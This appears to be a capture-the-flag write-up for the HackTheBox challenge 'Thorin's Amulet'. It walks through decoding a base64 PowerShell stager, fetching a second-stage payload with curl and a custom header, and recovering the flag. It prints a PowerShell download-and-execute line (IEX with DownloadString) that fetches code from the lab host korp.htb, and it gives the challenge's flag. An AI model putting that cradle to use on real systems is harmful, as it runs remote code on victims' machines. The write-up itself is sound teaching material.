# Thorin’s Amulet 
![image](https://github.com/user-attachments/assets/5bbd05a8-1610-473e-b069-11939a66846d)

## Solve
Download the given file and spawn the docker.

Attempt to connect to the port but fails: 

![image](https://github.com/user-attachments/assets/604da6db-9b2e-462e-b35d-04a9be745e0b)

Check the powershell script that was provided and we find this: 

![image](https://github.com/user-attachments/assets/736e06c3-0ad1-4efb-9178-d1843b0e7456)

Decode the base64 encoded ciphertext and we get: 
```
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update") 
```

Now we know that it is a powershell script that runs a code remotely from the korp.htb server and downloads the text content from the URL given. 

Since we’ve gotten the port number from the docker, let’s try to access the site. 

Let’s use the ‘curl’ command to reach the data of that specific site: 

![image](https://github.com/user-attachments/assets/cae3cae2-3358-4ad9-b7ee-190cfd8d42d8)

What we got seems to be a second payload this time with the script sending a GET request to ‘http://korp.htb:31227/a541a’ and a custom header ‘X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d’. Now, let’s try to ‘curl’ again with the custom header: 

![image](https://github.com/user-attachments/assets/10f0b375-77ec-41e3-b5ca-476bc8a7da72)

Here we get a ciphertext that seems to be in hex format. After decrypting it we get our flag. 
```
Flag = HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r} 
```
